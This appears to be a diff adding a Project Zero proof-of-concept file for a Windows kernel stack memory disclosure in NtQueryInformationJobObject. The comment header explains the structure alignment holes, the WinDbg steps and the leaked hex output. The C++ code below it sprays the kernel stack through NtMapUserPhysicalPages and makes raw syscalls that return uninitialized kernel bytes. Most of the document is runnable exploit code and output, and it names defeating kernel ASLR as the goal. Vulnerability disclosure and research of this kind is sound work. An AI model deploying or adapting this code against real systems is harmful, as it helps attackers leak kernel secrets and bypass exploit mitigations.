@@ -1,0 +1,219 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1189&desc=2
+
+We have discovered that the nt!NtQueryInformationJobObject system call (corresponding to the documented QueryInformationJobObject() API function) called with the JobObjectExtendedLimitInformation information class discloses portions of uninitialized kernel stack memory to user-mode clients, due to output structure alignment holes.
+
+On our test Windows 7 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff ff ................
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. The output data is returned in a JOBOBJECT_EXTENDED_LIMIT_INFORMATION structure [1]. If we map the above shadow bytes to the structure definition, it turns out that the uninitialized bytes correspond to the alignment hole between the end of the JOBOBJECT_BASIC_LIMIT_INFORMATION structure and the beginning of the adjacent IO_COUNTERS structure. The length of the former is 0x2C (44), while the latter must be 8-byte aligned, so there is a gap at offsets 0x2C-0x2F, which is not initialized by the kernel.
+
+The vulnerability can be easily demonstrated with a kernel debugger (WinDbg), by setting a breakpoint on nt!NtQueryInformationJobObject, manually filling out the structure memory with a marker byte (0x41), and then observing four of these bytes printed out by the attached proof-of-concept program:
+
+--- cut ---
+2: kd> bp nt!NtQueryInformationJobObject
+2: kd> g
+Breakpoint 0 hit
+nt!NtQueryInformationJobObject:
+818d5891 6890010000      push    190h
+3: kd> p
+nt!NtQueryInformationJobObject+0x5:
+818d5896 68e0cf6981      push    offset nt! ?? ::FNODOBFM::`string'+0x6100 (8169cfe0)
+3: kd> p
+nt!NtQueryInformationJobObject+0xa:
+818d589b e8b8dbdeff      call    nt!_SEH_prolog4 (816c3458)
+3: kd> p
+nt!NtQueryInformationJobObject+0xf:
+818d58a0 33f6            xor     esi,esi
+3: kd> f ebp-18c ebp-18c+70-1 41
+Filled 0x70 bytes
+3: kd> g
+--- cut ---
+
+An example output on our test virtual machine is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 20 00 00 00 05 00 00 00 41 41 41 41 .... .......AAAA
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+
+################################################################################
+
+Upon further investigation of the bug, we have determined the following:
+
+- Not only the JobObjectExtendedLimitInformation (9), but also the JobObjectBasicLimitInformation (2) information class is affected by the vulnerability. The issue is very similar in that it also leaks 4 uninitialized bytes of kernel stack at offset 0x2C of the output structure. Since both classes are handled by the same or very close code areas, we are treating both cases as the same bug.
+
+- Windows 10 (contrary to Windows 7) allows the output buffer for JobObjectExtendedLimitInformation to optionally be 120-bytes long instead of the typical 112. In that case, extra 4 kernel stack bytes are leaked at the end of the structure.
+
+- It is possible to demonstrate the bug without resorting to a kernel debugger, by using the nt!NtMapUserPhysicalPages system call to spray the kernel stack with a large number of controlled bytes, and then invoking the affected nt!NtQueryInformationJobObject syscall directly, instead of through the QueryInformationJobObject() API.
+
+To address all of the above new facts, I'm attaching a new proof-of-concept program, specific to Windows 10 1607 32-bit, which demonstrates the memory disclosure in all three possible settings: JobObjectBasicLimitInformation (output length 48), JobObjectExtendedLimitInformation (output length 112) and JobObjectExtendedLimitInformation (output length 120). An example output of the program is shown below:
+
+--- cut ---
+JobObjectBasicLimitInformation:
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 05 00 00 00 41 41 41 41 ............AAAA
+JobObjectExtendedLimitInformation (112):
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 05 00 00 00 41 41 41 41 ............AAAA
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+JobObjectExtendedLimitInformation (120):
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 05 00 00 00 41 41 41 41 ............AAAA
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000070: 00 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+--- cut ---
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <cstdio>
+
+extern "C"
+ULONG WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[4096];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 10 1607 32-bit.
+  CONST ULONG __NR_NtQueryInformationJobObject = 0x00b9;
+
+  // Create a job object to operate on.
+  HANDLE hJob = CreateJobObject(NULL, NULL);
+
+  // Spray the kernel stack with a marker value, to get visible results.
+  SprayKernelStack();
+
+  // Trigger the bug in nt!NtQueryInformationJobObject(JobObjectBasicLimitInformation).
+  DWORD ReturnLength = 0;
+  BYTE output[120] = { /* zero padding */ };
+ 
+  NTSTATUS st = SystemCall32(__NR_NtQueryInformationJobObject, hJob, JobObjectBasicLimitInformation, &output, sizeof(JOBOBJECT_BASIC_LIMIT_INFORMATION), &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationJobObject#1 failed, %x\n", st);
+    CloseHandle(hJob);
+    return 1;
+  }
+
+  // Print out the output.
+  printf("JobObjectBasicLimitInformation:\n");
+  PrintHex(output, ReturnLength);
+
+  // Spray the kernel again before invoking the affected system call.
+  SprayKernelStack();
+
+  // Trigger the bug in nt!NtQueryInformationJobObject(JobObjectExtendedLimitInformation), buffer size 112.
+  ZeroMemory(output, sizeof(output));
+
+  st = SystemCall32(__NR_NtQueryInformationJobObject, hJob, JobObjectExtendedLimitInformation, output, 112, &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationJobObject#2 failed, %x\n", st);
+    CloseHandle(hJob);
+    return 1;
+  }
+
+  // Print the output again.
+  printf("JobObjectExtendedLimitInformation (112):\n");
+  PrintHex(output, ReturnLength);
+
+  // Spray the kernel again before invoking the affected system call.
+  SprayKernelStack();
+
+  // Trigger the bug in nt!NtQueryInformationJobObject(JobObjectExtendedLimitInformation), buffer size 120.
+  ZeroMemory(output, sizeof(output));
+
+  st = SystemCall32(__NR_NtQueryInformationJobObject, hJob, JobObjectExtendedLimitInformation, output, 120, &ReturnLength);
+  if (!NT_SUCCESS(st)) {
+    printf("NtQueryInformationJobObject#2 failed, %x\n", st);
+    CloseHandle(hJob);
+    return 1;
+  }
+
+  // Print the output again.
+  printf("JobObjectExtendedLimitInformation (120):\n");
+  PrintHex(output, ReturnLength);
+
+  // Free resources.
+  CloseHandle(hJob);
+
+  return 0;
+}
